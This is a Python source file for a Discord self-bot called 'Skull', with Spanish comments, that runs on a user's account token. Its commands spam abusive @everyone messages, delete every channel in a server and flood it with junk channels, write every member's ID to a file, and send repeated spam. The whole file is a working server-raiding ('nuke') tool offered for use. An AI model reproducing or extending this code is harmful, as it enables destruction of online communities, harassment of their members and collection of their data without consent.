from discord.ext import commands

#Token de tu cuenta.
token = "your token here" 

#Prefix para tu bot
bot_prefix= "."

bot = commands.Bot(command_prefix=bot_prefix, case_insensitive=True, self_bot=True)

@bot.event
async def on_ready():
  #Mensagem do console.
  print("☠️ - Skull v.1 iniciado") 

@bot.command()
async def ayuda(ctx):#mostrara sus comandos
  await ctx.message.delete()
  await ctx.channel.send("```.ping hará spam y enviará ping                        .prefix y el símbolo que quieres cambiar y se cambiara                                                .mc eliminara todos los canales y creara canales                                     .spam <cantidad> <mensaje> y lo enviara```")

@bot.command()#hara spam no es mucho pero sirve
async def ping(ctx):
  await ctx.channel.send("@everyone Fuck you")
  await ctx.channel.send("@everyone Stupid Owner")
  await ctx.channel.send("@everyone I Love Skull")
  await ctx.channel.send("@everyone Go cry")
  await ctx.channel.send("@everyone Ur mom is Stupid")

@bot.command()#cambiara el prefix
async def prefix(ctx, prefix):
    bot.command_prefix = str(prefix)
    await ctx.message.delete()
    await ctx.send('```Tu prefix se a cambiado```')

@bot.command(aliases=['mc'])#eliminara los canales y creara
async def masschannels(ctx, amount=100):
    await ctx.message.delete()
    channels = ctx.guild.channels
    for channel in channels:
        try:
            await channel.delete()
            print(channel.name + " Se a eliminado")
        except:
            pass
            print("error")
            guild = ctx.message.guilds
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(("Skull the best"))
            print(f"[{i}] canal creado")
        except:
            print("error al crear el canal")

@bot.command()
async def scrape(ctx):
    await ctx.message.delete()
    mem = ctx.guild.members
    for member in mem:
        try:
            print("Finished scraping")
            mfil = open("Scraped/members.txt", "a")

            mfil.write(str(member.id) + "\n")
            mfil.close()


        except Exception as e:
            print("channels are not created")

@bot.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(f'{message}\n' * 1)

bot.run(token, bot=False)
